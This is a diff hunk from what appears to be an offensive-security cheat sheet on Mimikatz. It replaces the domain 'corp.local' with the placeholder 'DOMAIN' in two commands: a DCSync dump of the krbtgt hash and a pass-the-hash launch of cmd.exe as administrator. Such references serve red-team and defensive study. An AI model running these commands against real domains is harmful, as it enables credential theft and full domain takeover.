@@ -48,13 +48,13 @@ mimikatz # lsadump::secrets
 DCSync a domain hash (needs replication rights, i.e. Domain Admin or equivalent):
 
 ```text
-mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt
 ```
 
 Pass-the-hash to open a shell as another user without their password:
 
 ```text
-mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:cmd.exe
+mimikatz # sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
 ```
 
 ## Workflow
